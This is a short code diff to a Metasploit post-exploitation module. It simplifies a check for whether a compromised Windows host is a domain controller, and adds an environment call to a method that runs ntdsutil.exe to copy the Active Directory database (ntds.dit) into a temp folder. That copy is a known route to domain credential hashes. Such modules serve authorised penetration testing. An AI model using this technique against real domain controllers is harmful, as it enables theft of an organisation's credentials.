@@ -72,14 +72,11 @@ class Metasploit3 < Msf::Post
   end
 
   def is_domain_controller?
-    status = false
-    if session.fs.file.exists?('%SystemDrive%\Windows\ntds\ntds.dit')
-      status = true
-    end
-    status
+    session.fs.file.exists?('%SystemDrive%\Windows\ntds\ntds.dit')
   end
 
   def ntdsutil_method
+    get_env
     tmp_path = "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
     command_arguments = "\"activate instance ntds\" \"ifm\" \"Create Full #{tmp_path}\" quit quit"
     result = cmd_exec("ntdsutil.exe", command_arguments)
